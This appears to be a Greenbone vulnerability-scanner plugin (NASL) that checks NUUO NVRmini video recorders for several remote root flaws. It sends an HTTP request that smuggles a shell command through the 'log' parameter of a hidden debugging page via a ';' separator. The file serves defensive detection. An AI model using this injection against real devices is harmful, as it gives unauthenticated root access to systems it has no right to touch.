# SPDX-FileCopyrightText: 2016 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:nuuo:nuuo";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.107042");
  script_version("2023-09-15T05:06:15+0000");
  script_cve_id("CVE-2016-5674", "CVE-2016-5675", "CVE-2016-5676", "CVE-2016-5677",
                "CVE-2016-5678", "CVE-2016-5679", "CVE-2016-5680");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"2023-09-15 05:06:15 +0000 (Fri, 15 Sep 2023)");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2017-09-03 01:29:00 +0000 (Sun, 03 Sep 2017)");
  script_tag(name:"creation_date", value:"2016-08-23 13:16:06 +0200 (Tue, 23 Aug 2016)");
  script_name("NUUO NVRmini <= 2 3.0.8 Remote Root Vulnerability");

  script_tag(name:"summary", value:"NUUO NVRmini is prone to a remote root exploit vulnerability.");

  script_tag(name:"vuldetect", value:"Tries to execute a command on the remote target as the root user
  via a HTTP GET request.");

  script_tag(name:"insight", value:"Multiple flaws exist due to:

  - The hidden page '__debugging_center_utils__.php' fails to properly validate the log parameter.

  - The 'handle_daylightsaving.php' page does not sanitise the NTPServer parameter.

  - An error in the cgi-bin/cgi_system binary.

  - The hidden page '__nvr_status___.php' fails to properly validate the parameter.

  - The sn parameter of the 'transfer_license' command in cgi_main does not properly validate
  user-provided input.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute
  arbitrary code as the root user and send a specially crafted request to stack-based buffer
  overflow.");

  script_tag(name:"affected", value:"NUUO NVRmini versions 2.3.0.8 and below are known to be
  affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_active");

  script_xref(name:"URL", value:"https://packetstormsecurity.com/files/138220/NUUO-3.0.8-Remote-Root.html");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/92318");
  script_xref(name:"URL", value:"http://www.vfocus.net/art/20160809/12861.html");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/40200");
  script_xref(name:"URL", value:"http://www.kb.cert.org/vuls/id/856152");

  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2016 Greenbone AG");
  script_dependencies("gb_nuuo_devices_web_detect.nasl");
  script_mandatory_keys("nuuo/web/detected");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("misc_func.inc");
include("os_func.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

cmds = exploit_commands( "linux" );

foreach pattern( keys( cmds ) ) {

  cmd = cmds[pattern];

  url = dir + "/__debugging_center_utils___.php?log=;" + cmd;

  if( http_vuln_check( port:port, url:url, pattern:pattern ) ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
